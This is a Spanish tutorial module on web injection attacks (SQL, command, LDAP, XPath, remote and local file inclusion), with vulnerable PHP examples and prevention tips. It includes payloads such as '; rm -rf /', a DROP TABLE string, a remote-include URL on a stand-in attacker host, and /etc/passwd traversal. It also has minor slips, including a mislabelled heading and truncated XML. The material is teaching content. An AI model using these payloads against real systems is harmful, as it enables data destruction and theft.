Módulo 12 - Inyección

La inyección en un sitio web es una técnica de ataque utilizada para insertar cadenas de texto, comandos, consultas o código malicioso en una aplicación web, con el fin de obtener acceso no autorizado o realizar acciones no deseadas en el servidor o en el navegador de los usuarios.

Un ejemplo común de inyección es la inyección SQL, que aprovecha las vulnerabilidades en las aplicaciones que utilizan bases de datos, como las aplicaciones de comercio electrónico o de banca en línea. En este tipo de ataque, los atacantes introducen comandos SQL maliciosos en formularios de entrada de datos, como campos de búsqueda o comentarios, con el objetivo de que esos comandos se ejecuten en la base de datos del servidor. Si el ataque tiene éxito, los atacantes pueden obtener acceso no autorizado a datos confidenciales, como nombres de usuario, contraseñas, información de tarjetas de crédito y otra información personal.

Otro ejemplo es la inyección de código malicioso en el servidor web, que se conoce como inyección de código. Este tipo de ataque implica la introducción de código malicioso en scripts y programas en el servidor web, lo que permite a los atacantes ejecutar su propio código en el servidor. Los atacantes pueden utilizar este método para tomar el control del servidor, robar datos, modificar archivos y realizar otras actividades maliciosas.

Tipos de Inyección

A continuación se presentan los posibles tipos de inyección en un sitio web:

  • Cross-Site Scripting (XSS) Injection: Permite a un atacante insertar código malicioso en las páginas web del sitio web que se ejecuta en el navegador de los usuarios.
  • SQL Injection: Permite a un atacante ejecutar comandos SQL no autorizados en la base de datos del sitio web.
  • Code Injection: Permite a un atacante ejecutar su propio código malicioso en el servidor del sitio web.
  • Command Injection: Permite a un atacante ejecutar comandos maliciosos en el servidor del sitio web.
  • LDAP Injection: Permite a un atacante ejecutar comandos LDAP no autorizados en el servidor del sitio web.
  • XPath Injection: Permite a un atacante ejecutar comandos XPath no autorizados en el servidor del sitio web.
  • Remote File Inclusion (RFI) Injection: Permite a un atacante incluir archivos remotos en el servidor del sitio web.
  • Local File Inclusion (LFI) Injection: Permite a un atacante incluir archivos locales en el servidor del sitio web.

Code Injection (Inyección de Código)

El code injection es una técnica de ataque en la que un atacante introduce código malicioso en un sitio web. Este código puede ser utilizado para ejecutar comandos en el servidor WEB, robar información confidencial o incluso tomar el control completo del servidor.

Un ejemplo común de code injection es cuando un atacante introduce código en un formulario de entrada de datos, como un campo de búsqueda o un comentario en un blog. Si la aplicación web no está protegida adecuadamente, el código malicioso puede ser ejecutado en el servidor. Por ejemplo, si el sitio web utiliza PHP, un atacante podría introducir código PHP malicioso en el campo de entrada. Si la aplicación web no valida o filtra adecuadamente el contenido del campo de entrada, el código malicioso podría ser ejecutado en el servidor, lo que permite al atacante tomar el control del servidor.

Para prevenir el code injection, es importante validar y filtrar adecuadamente los datos de entrada en la aplicación web. También es importante restringir el acceso a los archivos y directorios sensibles del servidor, y asegurarse de que la aplicación web se ejecute con los permisos de usuario más bajos o limitados posibles.

Aquí tenemos algunos ejemplos relacionados con funciones y parámetros que podrían ser proclives a la inyección de código en un sitio WEB:

  • eval(): Esta función toma una cadena como argumento y la ejecuta como código PHP. Si un atacante puede controlar la entrada a esta función, puede ejecutar código PHP arbitrario en el servidor.
  • include(), require(), include_once(), require_once(): Estas funciones permiten incluir y ejecutar el contenido de un archivo especificado. Si un atacante puede controlar el nombre o la ruta del archivo, puede hacer que el servidor ejecute código malicioso desde una fuente externa.
  • create_function(): Esta función crea una función anónima a partir de los parámetros y el código dados como cadenas. Si un atacante puede inyectar código en alguno de estos parámetros, puede crear una función maliciosa que se ejecute en el servidor.
  • preg_replace(): Esta función realiza una búsqueda y sustitución de una expresión regular. Si se usa el modificador /e, el segundo parámetro se evalúa como código PHP. Si un atacante puede inyectar código en este parámetro, puede ejecutarlo en el servidor.
  • assert(): Esta función comprueba si una afirmación es verdadera y ejecuta el código especificado si no lo es. Si un atacante puede inyectar código en la afirmación, puede ejecutarlo en el servidor.
  • Inyección de JavaScript en el lado del servidor en Node.js: Esto ocurre cuando un atacante puede inyectar código JavaScript en una aplicación Node.js y hacer que sea ejecutado por el intérprete Node.js. Esto puede conducir a la ejecución remota de código, denegación de servicio o divulgación de información.

Un ejemplo de código vulnerable a code injection en PHP sería el siguiente:

<?php
  $nombre = $_POST['nombre'];
  $apellido = $_POST['apellido'];
  $sql = "INSERT INTO usuarios (nombre, apellido) VALUES ('$nombre', '$apellido')";
  mysqli_query($conn, $sql);
?>

En este código, el usuario puede enviar valores maliciosos a través de los campos de entrada nombre y apellido, lo que permite la inyección de código. Por ejemplo, si el usuario envía el valor 'Foo'); DROP TABLE usuarios; --' en el campo apellido, se ejecutará el siguiente comando SQL malicioso:

INSERT INTO usuarios (nombre, apellido) VALUES ('Foo', ''); DROP TABLE usuarios; --')

Este comando eliminará la tabla usuarios de la base de datos, lo que puede causar daños irreparables en la aplicación web. Para prevenir este tipo de ataque, es importante validar y filtrar adecuadamente los datos de entrada del usuario en la aplicación web.

Prevención de vulnerabilidades Code Injection

  • Validar los datos de entrada del usuario para asegurarse de que contengan sólo los caracteres permitidos. Por ejemplo, si un campo de entrada debe contener sólo números, la aplicación web debe asegurarse de que el campo no contenga caracteres alfabéticos o especiales.
  • Si un campo de entrada debe contener sólo texto, la aplicación web debe asegurarse de que el campo no contenga caracteres numéricos o especiales.
  • Utilizar una capa de seguridad adicional, como una lista blanca de caracteres permitidos, para reducir la posibilidad de vulnerabilidades en el código de la aplicación web.

Command Injection (Inyección de Comandos)

La inyección de comandos, también conocida como command injection, es una técnica de ataque utilizada para ejecutar comandos maliciosos en un servidor web. Los atacantes aprovechan las vulnerabilidades en las aplicaciones web que utilizan comandos del sistema operativo, como la línea de comandos o las shell scripts, para introducir comandos maliciosos en los campos de entrada de datos, como los campos de búsqueda o los comentarios. Si la aplicación web no está protegida adecuadamente, estos comandos maliciosos pueden ser ejecutados en el servidor, lo que permite a los atacantes tomar el control del servidor y realizar acciones no deseadas.

Por ejemplo, un atacante podría introducir el siguiente comando malicioso en un campo de entrada:

; rm -rf /

Si la aplicación web no valida o filtra adecuadamente el contenido de este campo de entrada, el comando malicioso podría ser ejecutado en el servidor, lo que eliminaría todos los archivos del sistema. Esto podría causar daños irreparables al servidor y a la aplicación web.

Prevención de Vulnerabilidades Command Injection

A continuación se presentan algunas recomendaciones para prevenir la inyección de comandos en sitios web:

  • Validar y filtrar los datos de entrada: Es importante validar y filtrar adecuadamente los datos de entrada en la aplicación web para asegurarse de que sólo contengan los caracteres permitidos. Por ejemplo, si un campo de entrada debe contener sólo números, la aplicación web debe asegurarse de que el campo no contenga caracteres alfabéticos o especiales. Si un campo de entrada debe contener sólo texto, la aplicación web debe asegurarse de que el campo no contenga caracteres numéricos o especiales. Además, es importante utilizar una capa de seguridad adicional, como una lista blanca de caracteres permitidos, para reducir la posibilidad de vulnerabilidades en el código de la aplicación web.
  • Utilizar parámetros en vez de comandos: Es importante utilizar parámetros en vez de comandos para la comunicación entre la aplicación web y el sistema operativo. Por ejemplo, en vez de utilizar el comando "ls" para listar los archivos de un directorio, la aplicación web debería utilizar una función del lenguaje de programación que permita listar los archivos del directorio utilizando parámetros.
  • Limitar el acceso a los comandos del sistema: Es importante limitar el acceso a los comandos del sistema del servidor web. Por ejemplo, es importante restringir el acceso a los archivos y directorios del sistema operativo a los usuarios y grupos necesarios para la aplicación web.
  • Utilizar comandos seguros: Es importante utilizar comandos seguros que no sean vulnerables a la inyección de comandos. Por ejemplo, la función "escapeshellarg" en PHP puede ser utilizada para escapar los caracteres especiales en los argumentos de los comandos del sistema operativo.
  • Utilizar una capa de seguridad adicional: Es importante utilizar una capa de seguridad adicional, como una lista blanca de comandos permitidos, para reducir la posibilidad de vulnerabilidades en el código de la aplicación web.
  • Mantener la aplicación web actualizada: Es importante mantener la aplicación web actualizada con las últimas versiones de los componentes y librerías utilizados para reducir la posibilidad de vulnerabilidades conocidas.
  • Realizar pruebas de seguridad: Es importante realizar pruebas de seguridad regulares en la aplicación web para identificar y corregir vulnerabilidades antes de que sean explotadas por los atacantes.

LDAP Injection (Inyección LDAP)

La inyección LDAP es una técnica de ataque que explota las vulnerabilidades en aplicaciones que utilizan el protocolo LDAP (Lightweight Directory Access Protocol) para la autenticación y el almacenamiento de información de usuarios. El protocolo LDAP se utiliza comúnmente en aplicaciones de directorio, como la autenticación de usuarios y el registro de direcciones de correo electrónico.

En un ataque de inyección LDAP, los atacantes introducen expresiones maliciosas en los campos de entrada de datos, como los campos de autenticación de usuario o de búsqueda de directorios, con el fin de obtener acceso no autorizado a la información de usuario o realizar acciones no deseadas en el servidor.

Por ejemplo, si una aplicación web utiliza el protocolo LDAP para la autenticación de usuarios, un atacante podría introducir una expresión maliciosa en el campo de autenticación de usuario para intentar obtener acceso no autorizado a la información de usuario. Si la aplicación web no valida o filtra adecuadamente el contenido de este campo de entrada, la expresión maliciosa podría ser ejecutada en el servidor LDAP, lo que permitiría al atacante obtener acceso no autorizado a la información de usuario.

Otro ejemplo de inyección LDAP podría ser cuando un atacante introduce una expresión maliciosa en un campo de búsqueda de directorios. Si la aplicación web no valida o filtra adecuadamente el contenido de este campo de entrada, la expresión maliciosa podría ser ejecutada en el servidor LDAP, lo que permitiría al atacante obtener información no autorizada sobre los usuarios del sistema.

Un ejemplo de inyección LDAP podría ser el siguiente:

Si una aplicación web utiliza el protocolo LDAP para la autenticación de usuarios, el siguiente código PHP podría ser vulnerable a la inyección LDAP:

<?php
  $usuario = $_POST['usuario'];
  $contraseña = $_POST['contraseña'];
  $ldap = ldap_connect("ldap://servidorldap.com");
  if ($ldap) {
    $bind = ldap_bind($ldap, "cn=$usuario,ou=usuarios,dc=servidorldap,dc=com", $contraseña);
    if ($bind) {
      echo "Bienvenido $usuario";
    } else {
      echo "Error de autenticación";
    }
    ldap_close($ldap);
  } else {
    echo "Error de conexión al servidor LDAP";
  }
?>

En este código, el usuario puede enviar valores maliciosos a través de los campos de entrada usuario y contraseña, lo que permite la inyección LDAP. Por ejemplo, si el usuario envía el valor '*)(uid=*))(|(uid=*))=*' en el campo usuario, se ejecutará la siguiente expresión maliciosa:

cn=*)(uid=*))(|(uid=*))=*,ou=usuarios,dc=servidorldap,dc=com

Esta expresión maliciosa devuelve todos los usuarios del directorio, lo que puede permitir al atacante obtener información no autorizada sobre los usuarios del sistema. Para prevenir este tipo de ataque, es importante validar y filtrar adecuadamente los datos de entrada del usuario en la aplicación web.

Prevención Vulnerabilidad LDAP Injection

  • Para prevenir la inyección LDAP, es importante validar y filtrar adecuadamente los datos de entrada en la aplicación web. Es importante asegurarse de que los campos de entrada de datos sólo contienen los caracteres permitidos y que el contenido se ajusta a un formato predefinido. Además, es importante utilizar una capa de seguridad adicional, como una lista blanca de caracteres permitidos, para reducir la posibilidad de vulnerabilidades en el código de la aplicación web.
  • También es importante restringir el acceso a los directorios LDAP y limitar los permisos de usuario a los necesarios para la aplicación web. Por ejemplo, los usuarios de la aplicación web sólo deberían tener acceso a los directorios y entradas de LDAP necesarios para la autenticación y el almacenamiento de información de usuario.
  • Asimismo, es importante utilizar versiones actualizadas de los componentes y librerías utilizados en la aplicación web para reducir la posibilidad de vulnerabilidades conocidas. También es recomendable realizar pruebas de seguridad regulares en la aplicación web para identificar y corregir vulnerabilidades antes de que sean explotadas por los atacantes.

XPATH Injection

La inyección XPath es una técnica de ataque orientado a explotar vulnerabilidades en aplicaciones web que utilizan el lenguaje XPath para consultar y procesar documentos XML.

XPath es un lenguaje de consulta utilizado para seleccionar elementos y atributos específicos de un documento XML.

En un ataque de inyección XPath, los atacantes aprovechan las vulnerabilidades en las aplicaciones web que utilizan expresiones XPath para introducir expresiones maliciosas en los campos de entrada de datos, como los campos de búsqueda o los comentarios. Si la aplicación web no está protegida adecuadamente, estas expresiones maliciosas pueden ser ejecutadas en el servidor, lo que permite a los atacantes tomar el control del servidor y realizar acciones no deseadas.

Por ejemplo, si una aplicación web utiliza XPath para procesar los datos de entrada de un formulario, un atacante podría introducir una expresión maliciosa en el campo de entrada para intentar obtener acceso no autorizado a la información del servidor. Si la aplicación web no valida o filtra adecuadamente el contenido de este campo de entrada, la expresión maliciosa podría ser ejecutada en el servidor, lo que permitiría al atacante obtener acceso no autorizado a la información del servidor.

Un ejemplo de código vulnerable a inyección XPath podría ser el siguiente:

Este sería el contenido del archivo datos.xml:

<?xml version="1.0" encoding="UTF-8"?>
<datos>
  <usuario>
    <nombre>Alice</nombre>
    <contraseña>12345</contraseña>
  </usuario>
  <usuario>
    <nombre>Bob</nombre>
    <contraseña>abcde</contraseña>
  </usuario>

    <nombre>Charlie</nombre>
    <contraseña>qwerty</contraseña>

Si una aplicación web utiliza XPath para procesar los datos de entrada de un formulario, el siguiente código PHP podría ser vulnerable a la inyección XPath:

<?php
  $nombre = $_GET['nombre'];
  $xml = simplexml_load_file("datos.xml");
  $resultado = $xml->xpath("//usuario[nombre='$nombre']");
  foreach ($resultado as $usuario) {
    echo "Nombre: " . $usuario->nombre . "
";
    echo "Contraseña: " . $usuario->contraseña . "
";
  }
?>

En este código, el usuario puede enviar valores maliciosos a través del campo de entrada nombre, lo que permite la inyección XPath. Por ejemplo, si el usuario envía el valor ' or 1=1 or nombre=' en el campo nombre, se ejecutará la siguiente expresión maliciosa:

//usuario[nombre='' or 1=1 or nombre='']

Esta expresión maliciosa devuelve todos los usuarios del documento XML, lo que permite al atacante obtener acceso no autorizado a la información del servidor.

Prevención vulnerabilidad XPATH Injection

  • Para prevenir la inyección XPath, es importante validar y filtrar adecuadamente los datos de entrada en la aplicación web. Es importante asegurarse de que los campos de entrada de datos sólo contienen los caracteres permitidos y que el contenido se ajusta a un formato predefinido. Además, es importante utilizar una capa de seguridad adicional, como una lista blanca de caracteres permitidos, para reducir la posibilidad de vulnerabilidades en el código de la aplicación web.
  • También es importante restringir el acceso a los archivos y directorios sensibles del servidor y limitar los permisos de usuario a los necesarios para la aplicación web. Por ejemplo, los usuarios de la aplicación web sólo deberían tener acceso a los archivos y directorios necesarios para el procesamiento de datos.

Remote File Inclusion (Inyección de archivos remotos)

Los atacantes aprovechan vulnerabilidades en aplicaciones web que permiten la inclusión de archivos externos, como scripts o páginas web, para introducir código malicioso por medio de archivos en el servidor. Si la aplicación web no está protegida adecuadamente, este código malicioso puede ser ejecutado en el servidor, lo que permite a los atacantes tomar el control del servidor y realizar acciones no deseadas.

Por ejemplo, si una aplicación web utiliza una función para importar archivos externos, un atacante podría introducir una URL maliciosa en el campo de entrada de datos para intentar incluir un archivo externo en la página web. Si la aplicación web no valida o filtra adecuadamente el contenido de este campo de entrada, la URL direccionada hacia el archivo malicioso podría ser ejecutada en el servidor, lo que permitiría al atacante tomar el control del servidor.

A continuación se presenta una guía paso a paso para validar la existencia de una vulnerabilidad RFI en un sitio web:

Un ejemplo de código vulnerable a la inyección de archivos remotos podría ser el siguiente:

<?php
  $pagina = $_GET['pagina'];
  include($pagina);
?>

En este código, el usuario puede enviar valores maliciosos a través del campo de entrada pagina, lo que permite la inyección de archivos remotos. Por ejemplo, si el usuario envía la URL maliciosa '<http://atacante.com/archivo_malicioso.php'> en el campo pagina, se incluirá el archivo malicioso en la página web, lo que permitiría al atacante llegar incluso hasta tomar el control del servidor.

Prevención XPATH Injection

Para prevenir la inyección de archivos remotos, es importante validar y filtrar adecuadamente los datos de entrada en la aplicación web. Es importante asegurarse de que los campos de entrada de datos sólo contienen los caracteres permitidos y que el contenido se ajusta a un formato predefinido. Además, es importante utilizar una capa de seguridad adicional, como una lista blanca de URLs permitidas, para reducir la posibilidad de vulnerabilidades en el código de la aplicación web.

También es importante restringir el acceso a los directorios y archivos sensibles del servidor y limitar los permisos de usuario a los necesarios para la aplicación web. Por ejemplo, los usuarios de la aplicación web sólo deberían tener acceso a los archivos y directorios necesarios para el procesamiento de datos.

Local File Inclusion (Inyección de archivos locales)

LFI es una técnica que permite a un atacante engañar a la aplicación web para que incluya archivos que están en el servidor web, aprovechando una funcionalidad que incluye dinámicamente archivos locales o scripts. Esto ocurre debido al uso de entradas proporcionadas por el usuario sin una validación adecuada. Esto puede llevar a algo como mostrar el contenido del archivo, pero dependiendo de la gravedad, también puede conducir a:

  • Ejecución de código en el servidor web
  • Ejecución de código en el lado del cliente, como JavaScript, que puede conducir a otros ataques como cross-site scripting (XSS)
  • Denegación de servicio (DoS)
  • Divulgación de información sensible

A continuación se presenta una guía paso a paso para validar la existencia de una vulnerabilidad LFI en un sitio web:

Un ejemplo simple de LFI sería cambiar la URL de una página que incluye el nombre de un archivo, como:

https://sitio-ejemplo.com/?modulo=contacto.php

Por una URL como esta:

https://sitio-ejemplo.com/?modulo=/etc/passwd

Y en ausencia de un filtrado adecuado, el servidor mostrará el contenido sensible del archivo /etc/passwd.

Un ejemplo de código vulnerable a la inyección de archivos locales podría ser el siguiente:

<?php
  $pagina = $_GET['pagina'];
  include($pagina);
?>

En este código, el usuario puede enviar valores maliciosos a través del campo de entrada pagina, lo que permite la inyección de archivos locales. Por ejemplo, si el usuario envía la ruta maliciosa ../../../../etc/passwd en el campo pagina, se incluirá el archivo /etc/passwd en la página web, lo que permitiría al atacante obtener información confidencial sobre el sistema.

Para qué sirve “../” ?

El conjunto de caracteres ../ es una secuencia que se utiliza en la inyección de archivos locales (LFI) para indicar que se debe retroceder un nivel en la jerarquía de directorios del servidor;

Prevención de vulnerabilidad Local File Inclusion

Para prevenir la inyección de archivos locales, es importante:

  • Validar y filtrar adecuadamente los datos de entrada en la aplicación web.
  • Asegurarse de que los campos de entrada de datos sólo contienen los caracteres permitidos y que el contenido se ajusta a un formato predefinido.
  • Utilizar una capa de seguridad adicional, como una lista blanca de rutas permitidas, para reducir la posibilidad de vulnerabilidades en el código de la aplicación web.
  • Restringir el acceso a los archivos y directorios sensibles del servidor y limitar los permisos de usuario a los necesarios para la aplicación web. Por ejemplo, los usuarios de la aplicación web sólo deberían tener acceso a los archivos y directorios necesarios para el procesamiento de datos.
  • Utilizar versiones actualizadas de los componentes y librerías utilizados en la aplicación web para reducir la posibilidad de vulnerabilidades conocidas.
  • También es recomendable realizar pruebas de seguridad regulares en la aplicación web para identificar y corregir vulnerabilidades antes de que sean explotadas por los atacantes.
